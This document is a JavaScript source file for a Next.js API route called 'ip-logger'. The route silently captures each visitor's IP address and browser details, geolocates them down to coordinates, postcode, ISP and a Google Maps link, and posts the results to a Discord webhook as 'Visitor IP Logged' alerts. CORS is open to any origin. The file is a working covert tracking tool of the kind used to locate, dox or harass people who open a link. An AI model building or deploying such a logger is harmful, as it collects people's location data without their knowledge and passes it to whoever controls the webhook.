// /pages/api/ip-logger.js - CORRECTED with webhook fixes
export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    // --- Get Client IP ---
    let clientIP = (
      req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.socket?.remoteAddress ||
      ''
    ).toString();
    if (!clientIP) clientIP = '0.0.0.0';
    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    clientIP = clientIP.replace(/^::ffff:/, '');
    const userAgent = (req.headers['user-agent'] || 'Unknown').toString();

    console.log('DEBUG: Starting IP lookup for:', clientIP);

    // --- API Key Check ---
    const KEY = process.env.BIGDATACLOUD_API_KEY;
    if (!KEY) {
      console.error('DEBUG: Missing BIGDATACLOUD_API_KEY');
      return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY' });
    }

    const BASE = 'https://api-bdc.net/data';
    
    // --- 1. Fetch Main Geolocation Data ---
    const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;
    
    let ipData = {};
    try {
      console.log('DEBUG: Fetching from:', GEO_URL);
      const response = await fetch(GEO_URL);
      const status = response.status;
      console.log('DEBUG: API Status:', status);
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error(`DEBUG: API error ${status}:`, errorText.substring(0, 200));
        return res.status(502).json({ success: false, error: `API error: ${status}` });
      }
      
      const rawText = await response.text();
      ipData = JSON.parse(rawText);
      console.log('DEBUG: Main geolocation fetch successful');
    } catch (fetchError) {
      console.error('DEBUG: Fetch failed:', fetchError.message);
      return res.status(500).json({ success: false, error: 'Failed to fetch data' });
    }

    // --- Extract Data SAFELY ---
    // Location data
    const latitude = ipData?.location?.latitude || null;
    const longitude = ipData?.location?.longitude || null;
    const continent = ipData?.location?.continent || 'Unknown';
    const region = ipData?.location?.principalSubdivision || 'Unknown';
    const city = ipData?.location?.city || 'Unknown';
    const locality = ipData?.location?.localityName || city;
    const postalCode = ipData?.location?.postcode || '';
    
    // Country data
    const country = ipData?.country?.name || 'Unknown';
    const countryCode = ipData?.country?.isoAlpha2 || 'Unknown';
    const callingCode = ipData?.country?.callingCode || '';
    const currency = ipData?.country?.currency?.code || '';
    const currencyName = ipData?.country?.currency?.name || '';
    
    // Network data - from main response only (simpler)
    const isp = ipData?.network?.organisation || 'Unknown';
    const asnNumber = ipData?.network?.autonomousSystemNumber;
    const asn = asnNumber ? `AS${asnNumber}` : 'Unknown';
    const connectionType = ipData?.network?.connectionType || 'Unknown';
    
    // Confidence/Accuracy data
    const confidence = ipData?.confidence || 'unknown';
    const confidenceArea = ipData?.confidenceArea || null;
    const accuracyRadius = ipData?.location?.accuracyRadius || null;
    
    // Timezone
    const timezone = ipData?.location?.timeZone?.ianaTimeId || 'Unknown';
    
    console.log('DEBUG: Extracted data - ISP:', isp, 'ASN:', asn, 'ConnType:', connectionType);

    // --- Generate Map URL (SIMPLIFIED - fix the main issue first) ---
    let mapUrl = null;
    if (latitude && longitude) {
      // SIMPLE Google Maps link first
      mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
      console.log('DEBUG: Created simple map URL');
    }

    // --- Build Final Data Object (SAFE VERSION) ---
    const structuredData = {
      ip: clientIP,
      timestamp: new Date().toISOString(),
      userAgent,
      location: {
        continent,
        continentCode: ipData?.location?.continentCode || '',
        country,
        countryCode,
        region,
        regionCode: ipData?.location?.isoPrincipalSubdivisionCode || '',
        city,
        locality,
        postalCode,
        latitude,
        longitude,
        plusCode: ipData?.location?.plusCode || '',
        accuracyRadius,
        confidence,
        confidenceArea: confidenceArea ? 'Present' : 'None',
        mapUrl
      },
      countryDetails: {
        callingCode: callingCode || 'N/A',
        currency: currency || 'N/A',
        currencyName: currencyName || 'N/A',
        flagEmoji: ipData?.country?.countryFlagEmoji || ''
      },
      network: {
        isp,
        asn,
        connectionType,
        organisation: ipData?.network?.organisation || 'Unknown'
      },
      timezone: {
        name: timezone
      },
      device: parseUserAgent(userAgent)
    };

    console.log('DEBUG: Structured data built, sending to Discord...');

    // --- Send to Discord (WITH ERROR HANDLING) ---
    let discordResult = { sent: false, error: null };
    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        await sendToDiscord(structuredData);
        discordResult.sent = true;
        console.log('DEBUG: Discord webhook sent successfully');
      } catch (discordError) {
        discordResult.sent = false;
        discordResult.error = discordError.message;
        console.error('DEBUG: Discord webhook failed:', discordError.message);
      }
    } else {
      console.warn('DEBUG: DISCORD_WEBHOOK_URL not set');
    }

    // --- Return Response ---
    return res.status(200).json({
      success: true,
      data: structuredData,
      discord: discordResult,
      _debug: process.env.NODE_ENV === 'development' ? { 
        hasConfidenceArea: !!confidenceArea,
        confidenceAreaType: confidenceArea ? typeof confidenceArea : 'none'
      } : undefined
    });

  } catch (err) {
    console.error('Handler error:', err);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      message: err.message 
    });
  }
}

// --- Helper Functions ---

function parseUserAgent(ua) {
  const s = (ua || '').toString();
  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
  
  // Browser detection
  if (/OPR|Opera/.test(s)) browser = 'Opera';
  else if (/Edg\//.test(s)) browser = 'Edge';
  else if (/Chrome\/\d+/i.test(s) && !/Edg\//i.test(s)) browser = 'Chrome';
  else if (/Firefox\/\d+/i.test(s)) browser = 'Firefox';
  else if (/Safari\/\d+/i.test(s) && !/Chrome\//i.test(s)) browser = 'Safari';
  
  // OS detection
  if (/\bWindows\b/i.test(s)) os = 'Windows';
  else if (/\bMacintosh\b|\bMac OS\b/i.test(s)) os = 'Mac OS';
  else if (/\bAndroid\b/i.test(s)) os = 'Android';
  else if (/\b(iPhone|iPad|iPod)\b/i.test(s)) os = 'iOS';
  else if (/\bLinux\b/i.test(s)) os = 'Linux';
  
  // Device detection
  if (/\bMobile\b/i.test(s) || (/Android/i.test(s) && /Mobile/i.test(s))) device = 'Mobile';
  else if (/\bTablet\b/i.test(s) || /iPad/i.test(s)) device = 'Tablet';
  if (/bot|crawler|spider/i.test(s)) device = 'Bot';
  
  return { browser, os, device, raw: s.substring(0, 150) };
}

async function sendToDiscord(data) {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) {
    throw new Error('DISCORD_WEBHOOK_URL not configured');
  }

  // Build SAFE field values (no undefined/null)
  const fields = [];
  
  // Always add basic fields
  fields.push({ 
    name: '📍 IP Address', 
    value: `\`\`\`${data.ip}\`\`\``, 
    inline: false 
  });
  
  fields.push({ 
    name: '🌍 Location', 
    value: `${data.location.country} / ${data.location.region} / ${data.location.city}`,
    inline: true 
  });
  
  fields.push({ 
    name: '📡 Network', 
    value: `**ISP:** ${data.network.isp}\n**ASN:** ${data.network.asn}\n**Type:** ${data.network.connectionType}`,
    inline: true 
  });
  
  if (data.location.latitude && data.location.longitude) {
    fields.push({ 
      name: '🎯 Coordinates', 
      value: `${data.location.latitude}, ${data.location.longitude}`,
      inline: true 
    });
  }
  
  if (data.location.accuracyRadius) {
    fields.push({ 
      name: '📏 Accuracy Radius', 
      value: `${data.location.accuracyRadius} km`,
      inline: true 
    });
  }
  
  fields.push({ 
    name: '✅ Confidence', 
    value: data.location.confidence.toUpperCase(),
    inline: true 
  });
  
  if (data.location.mapUrl) {
    fields.push({ 
      name: '🗺️ Map', 
      value: `[View on Google Maps](${data.location.mapUrl})`,
      inline: false 
    });
  }
  
  fields.push({ 
    name: '🖥️ Device', 
    value: `${data.device.browser} / ${data.device.os}`,
    inline: true 
  });

  const embed = {
    embeds: [{
      title: '🌐 Visitor IP Logged',
      color: 0x3498db,
      timestamp: data.timestamp,
      fields: fields,
      footer: { 
        text: `IP Logger • ${new Date().toLocaleDateString()}`
      }
    }]
  };

  console.log('DEBUG: Sending Discord embed with', fields.length, 'fields');
  
  try {
    const response = await fetch(webhook, { 
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' }, 
      body: JSON.stringify(embed),
      timeout: 10000 // 10 second timeout
    });
    
    console.log('DEBUG: Discord response status:', response.status);
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('DEBUG: Discord API error:', response.status, errorText);
      throw new Error(`Discord API responded with ${response.status}: ${errorText.substring(0, 100)}`);
    }
    
    return true;
  } catch (error) {
    console.error('DEBUG: Failed to send to Discord:', error.message);
    throw error;
  }
}
